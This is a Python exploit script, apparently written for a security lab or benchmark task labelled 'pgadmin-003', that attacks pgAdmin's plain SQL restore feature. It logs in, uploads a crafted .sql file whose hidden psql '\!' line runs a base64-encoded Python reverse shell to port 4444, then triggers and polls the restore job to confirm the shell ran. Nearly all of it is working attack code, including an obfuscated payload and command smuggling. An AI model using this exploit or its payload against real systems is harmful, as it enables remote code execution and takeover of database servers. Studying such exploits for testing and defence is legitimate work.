#!/usr/bin/env python3
"""Run a pgAdmin plain SQL restore that starts a verified shell."""

import base64
import http.cookiejar
import json
import os
import re
import time
import urllib.parse
import urllib.request
import uuid


def request_text(
    opener: urllib.request.OpenerDirector,
    url: str,
    data: bytes | None = None,
    headers: dict[str, str] | None = None,
) -> str:
    request = urllib.request.Request(url, data=data, headers=headers or {})
    with opener.open(request, timeout=45) as response:
        return response.read().decode("utf-8", errors="replace")


def request_json(
    opener: urllib.request.OpenerDirector,
    url: str,
    data: bytes | None,
    headers: dict[str, str],
) -> dict:
    return json.loads(request_text(opener, url, data, headers))


def require_success(response: dict, operation: str) -> dict:
    if response.get("success") != 1:
        raise RuntimeError(f"{operation} failed: {response}")
    return response["data"]


def login(opener: urllib.request.OpenerDirector, target: str) -> str:
    html = request_text(opener, f"{target}/login")
    match = re.search(r'"csrfToken":\s*"([^\"]+)"', html)
    if match is None:
        raise RuntimeError("login page has no CSRF token")
    token = match.group(1)
    form = urllib.parse.urlencode({
        "email": "attacker@example.com",
        "password": "pgadmin003-public",
        "csrf_token": token,
    }).encode()
    request_text(
        opener,
        f"{target}/authenticate/login",
        form,
        {"Content-Type": "application/x-www-form-urlencoded"},
    )
    return token


def shell_sql() -> bytes:
    code = (
        "import os,socket;"
        "sock=socket.socket();"
        "sock.connect(('127.0.0.1',4444));"
        "[os.dup2(sock.fileno(),fd) for fd in (0,1,2)];"
        "os.execl('/bin/sh','sh','-i')"
    )
    encoded = base64.b64encode(code.encode()).decode()
    command = f'python3 -c \'import base64;exec(base64.b64decode("{encoded}"))\''
    return b"SELECT 1;\r\\! " + command.encode() + b"\r"


def upload_sql(
    opener: urllib.request.OpenerDirector,
    target: str,
    token: str,
    filename: str,
) -> str:
    headers = {
        "Content-Type": "application/json",
        "X-CSRFToken": token,
        "X-pgA-CSRFToken": token,
    }
    init = request_json(
        opener,
        f"{target}/file_manager/init",
        json.dumps({"dialog_type": "storage_dialog", "supported_types": ["*"]}).encode(),
        headers,
    )
    trans_id = require_success(init, "file manager initialization")["transId"]
    boundary = "dojo-pgadmin-003-upload"
    body = (
        f'--{boundary}\r\nContent-Disposition: form-data; name="currentpath"\r\n\r\n/\r\n'
        f'--{boundary}\r\nContent-Disposition: form-data; name="newfile"; filename="{filename}"\r\n'
        "Content-Type: application/sql\r\n\r\n"
    ).encode() + shell_sql() + f"\r\n--{boundary}--\r\n".encode()
    upload_headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "X-CSRFToken": token,
        "X-pgA-CSRFToken": token,
    }
    uploaded = request_json(
        opener,
        f"{target}/file_manager/filemanager/{trans_id}/",
        body,
        upload_headers,
    )
    require_success(uploaded, "SQL upload")
    return f"/{filename}"


def restore_sql(
    opener: urllib.request.OpenerDirector,
    target: str,
    token: str,
    filename: str,
) -> tuple[str, int]:
    headers = {
        "Content-Type": "application/json",
        "X-CSRFToken": token,
        "X-pgA-CSRFToken": token,
    }
    connection = request_json(
        opener,
        f"{target}/browser/server/connect/1/1",
        b'{"password":"fixture","save_password":true}',
        headers,
    )
    require_success(connection, "database connection")
    restore = request_json(
        opener,
        f"{target}/restore/job/1",
        json.dumps({
            "file": filename,
            "format": "plain",
            "database": "postgres",
        }).encode(),
        headers,
    )
    job_id = require_success(restore, "plain SQL restore")["job_id"]
    for _ in range(30):
        time.sleep(1)
        status = request_json(
            opener,
            f"{target}/misc/bgprocess/{job_id}",
            None,
            headers,
        )
        if status.get("exit_code") is not None:
            return job_id, status["exit_code"]
    raise RuntimeError(f"restore job {job_id} did not finish")


def main() -> None:
    target = os.environ["REMOTE_TARGET_URL"].rstrip("/")
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()),
    )
    token = login(opener, target)
    filename = f"pgadmin003-{uuid.uuid4().hex}.sql"
    path = upload_sql(opener, target, token, filename)
    job_id, exit_code = restore_sql(opener, target, token, path)
    if exit_code != 0:
        raise RuntimeError(f"restore job {job_id} exited with status {exit_code}")
    print(json.dumps({
        "evidence_payload": {
            "restore_job_id": job_id,
            "restore_exit_code": exit_code,
            "uploaded_file": filename,
        },
    }))


if __name__ == "__main__":
    main()
